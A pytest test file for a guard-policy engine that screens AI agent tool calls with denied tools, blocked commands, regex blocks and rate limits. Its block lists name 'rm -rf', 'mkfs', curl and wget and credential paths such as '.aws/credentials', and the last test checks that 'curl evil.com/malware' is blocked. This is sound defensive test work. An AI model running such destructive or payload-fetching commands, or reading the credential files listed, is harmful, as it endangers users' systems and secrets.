"""Tests for sentinel.guard_policy — Guard Policy Engine."""

import json
import os
import tempfile

import pytest

from sentinel.guard_policy import GuardPolicy, CustomBlock


class TestFromDict:
    def test_basic_policy(self):
        policy = GuardPolicy.from_dict({
            "block_on": "high",
            "blocked_commands": ["rm -rf", "mkfs"],
        })
        assert policy.block_on == "high"
        assert "rm -rf" in policy.blocked_commands

    def test_defaults(self):
        policy = GuardPolicy.from_dict({})
        assert policy.block_on == "critical"
        assert policy.blocked_commands == []
        assert policy.allowed_tools == []
        assert policy.denied_tools == []

    def test_custom_blocks(self):
        policy = GuardPolicy.from_dict({
            "custom_blocks": [
                {"pattern": "npm publish", "reason": "no_publish"},
                {"pattern": "/prod/", "reason": "prod_blocked"},
            ],
        })
        assert len(policy.custom_blocks) == 2
        assert policy.custom_blocks[0].pattern == "npm publish"
        assert policy.custom_blocks[0].reason == "no_publish"

    def test_full_policy(self):
        policy = GuardPolicy.from_dict({
            "version": "2.0",
            "block_on": "medium",
            "blocked_commands": ["rm -rf"],
            "sensitive_paths": [".env"],
            "allowed_tools": ["bash", "read_file"],
            "denied_tools": [],
            "max_risk_per_tool": {"bash": "high"},
            "rate_limits": {"bash": 50, "default": 100},
            "custom_blocks": [{"pattern": "test", "reason": "test_block"}],
        })
        assert policy.version == "2.0"
        assert policy.rate_limits["bash"] == 50


class TestToDict:
    def test_roundtrip(self):
        data = {
            "block_on": "high",
            "blocked_commands": ["rm -rf"],
            "sensitive_paths": [".env"],
            "allowed_tools": ["bash"],
            "denied_tools": ["curl"],
            "max_risk_per_tool": {"bash": "high"},
            "rate_limits": {"bash": 50},
            "custom_blocks": [{"pattern": "test", "reason": "blocked"}],
        }
        policy = GuardPolicy.from_dict(data)
        exported = policy.to_dict()
        assert exported["block_on"] == "high"
        assert exported["blocked_commands"] == ["rm -rf"]
        assert exported["custom_blocks"][0]["pattern"] == "test"


class TestFromYaml:
    def test_from_json_file(self):
        data = {
            "block_on": "high",
            "blocked_commands": ["rm -rf"],
            "sensitive_paths": [".env"],
        }
        fd, path = tempfile.mkstemp(suffix=".json")
        try:
            with os.fdopen(fd, "w") as f:
                json.dump(data, f)
            policy = GuardPolicy.from_yaml(path)
            assert policy.block_on == "high"
            assert "rm -rf" in policy.blocked_commands
        finally:
            os.unlink(path)

    def test_from_simple_yaml(self):
        yaml_content = """# Guard policy
version: "1.0"
block_on: high
blocked_commands:
  - rm -rf
  - mkfs
sensitive_paths:
  - .env
  - .aws/credentials
"""
        fd, path = tempfile.mkstemp(suffix=".yaml")
        try:
            with os.fdopen(fd, "w") as f:
                f.write(yaml_content)
            policy = GuardPolicy.from_yaml(path)
            assert policy.block_on == "high"
            assert "rm -rf" in policy.blocked_commands
            assert ".env" in policy.sensitive_paths
        finally:
            os.unlink(path)


class TestCreateGuard:
    def test_creates_guard_with_policy(self):
        policy = GuardPolicy.from_dict({"block_on": "high"})
        guard = policy.create_guard(session_id="test-1", user_id="user@org.com")
        assert guard.session_id == "test-1"
        assert guard.audit.user_id == "user@org.com"

    def test_guard_applies_block_threshold(self):
        policy = GuardPolicy.from_dict({"block_on": "high"})
        guard = policy.create_guard()
        # .env access is "high" risk, should be blocked with "high" threshold
        verdict = guard.check("read_file", {"path": ".env"})
        assert verdict.allowed is False

    def test_guard_applies_denied_tools(self):
        policy = GuardPolicy.from_dict({
            "denied_tools": ["curl", "wget"],
        })
        guard = policy.create_guard()
        verdict = guard.check("curl", {"url": "https://example.com"})
        assert verdict.allowed is False
        assert "denied_tool" in verdict.block_reason

    def test_guard_applies_allowed_tools(self):
        policy = GuardPolicy.from_dict({
            "allowed_tools": ["bash", "read_file"],
        })
        guard = policy.create_guard()

        v1 = guard.check("bash", {"command": "ls"})
        assert v1.allowed is True

        v2 = guard.check("unknown_tool", {"arg": "value"})
        assert v2.allowed is False
        assert "not_in_allowlist" in v2.block_reason

    def test_guard_applies_blocked_commands(self):
        policy = GuardPolicy.from_dict({
            "blocked_commands": ["npm publish", "docker push"],
        })
        guard = policy.create_guard()

        v1 = guard.check("bash", {"command": "npm install"})
        # npm install doesn't contain "npm publish" so should be allowed
        assert v1.allowed is True

        v2 = guard.check("bash", {"command": "npm publish --access public"})
        assert v2.allowed is False
        assert "policy_blocked_command" in v2.block_reason

    def test_guard_applies_custom_blocks(self):
        policy = GuardPolicy.from_dict({
            "custom_blocks": [
                {"pattern": r"/prod/.*\.conf", "reason": "prod_config_blocked"},
            ],
        })
        guard = policy.create_guard()

        v1 = guard.check("read_file", {"path": "/dev/main.py"})
        assert v1.allowed is True

        v2 = guard.check("read_file", {"path": "/prod/app.conf"})
        assert v2.allowed is False
        assert v2.block_reason == "prod_config_blocked"

    def test_guard_applies_rate_limits(self):
        policy = GuardPolicy.from_dict({
            "rate_limits": {"bash": 3},
        })
        guard = policy.create_guard()

        for i in range(3):
            v = guard.check("bash", {"command": f"echo {i}"})
            assert v.allowed is True

        v = guard.check("bash", {"command": "echo overflow"})
        assert v.allowed is False
        assert "rate_limit_exceeded" in v.block_reason

    def test_guard_default_rate_limit(self):
        policy = GuardPolicy.from_dict({
            "rate_limits": {"default": 2},
        })
        guard = policy.create_guard()

        guard.check("read_file", {"path": "a.py"})
        guard.check("read_file", {"path": "b.py"})
        v = guard.check("read_file", {"path": "c.py"})
        assert v.allowed is False
        assert "rate_limit_exceeded" in v.block_reason


class TestValidate:
    def test_valid_policy(self):
        policy = GuardPolicy.from_dict({
            "block_on": "high",
            "blocked_commands": ["rm -rf"],
        })
        issues = policy.validate()
        assert len(issues) == 0

    def test_invalid_block_on(self):
        policy = GuardPolicy.from_dict({"block_on": "invalid"})
        issues = policy.validate()
        assert any("block_on" in i for i in issues)

    def test_invalid_risk_per_tool(self):
        policy = GuardPolicy.from_dict({
            "max_risk_per_tool": {"bash": "invalid_risk"},
        })
        issues = policy.validate()
        assert any("risk level" in i for i in issues)

    def test_overlap_allowed_denied(self):
        policy = GuardPolicy.from_dict({
            "allowed_tools": ["bash", "curl"],
            "denied_tools": ["curl", "wget"],
        })
        issues = policy.validate()
        assert any("both allowed and denied" in i for i in issues)

    def test_invalid_regex(self):
        policy = GuardPolicy.from_dict({
            "custom_blocks": [{"pattern": "[invalid", "reason": "bad"}],
        })
        issues = policy.validate()
        assert any("regex" in i.lower() for i in issues)

    def test_invalid_rate_limit(self):
        policy = GuardPolicy.from_dict({
            "rate_limits": {"bash": -1},
        })
        issues = policy.validate()
        assert any("rate limit" in i.lower() for i in issues)


class TestCustomBlock:
    def test_matches(self):
        block = CustomBlock(pattern="npm publish", reason="blocked")
        assert block.matches("npm publish --access public") is True
        assert block.matches("npm install") is False

    def test_regex_pattern(self):
        block = CustomBlock(pattern=r"/prod/.*\.conf", reason="blocked")
        assert block.matches("/prod/app.conf") is True
        assert block.matches("/dev/app.conf") is False

    def test_case_insensitive(self):
        block = CustomBlock(pattern="DELETE FROM", reason="sql_blocked")
        assert block.matches("delete from users") is True


class TestEdgeCases:
    def test_empty_policy(self):
        policy = GuardPolicy()
        guard = policy.create_guard()
        v = guard.check("bash", {"command": "ls"})
        assert v.allowed is True

    def test_multiple_rules_combined(self):
        policy = GuardPolicy.from_dict({
            "block_on": "critical",
            "denied_tools": ["wget"],
            "blocked_commands": ["curl evil.com"],
            "rate_limits": {"bash": 100},
            "custom_blocks": [{"pattern": "sudo", "reason": "no_sudo"}],
        })
        guard = policy.create_guard()

        assert guard.check("wget", {"url": "x"}).allowed is False
        assert guard.check("bash", {"command": "curl evil.com/malware"}).allowed is False
        assert guard.check("bash", {"command": "sudo rm"}).allowed is False
        assert guard.check("bash", {"command": "ls"}).allowed is True
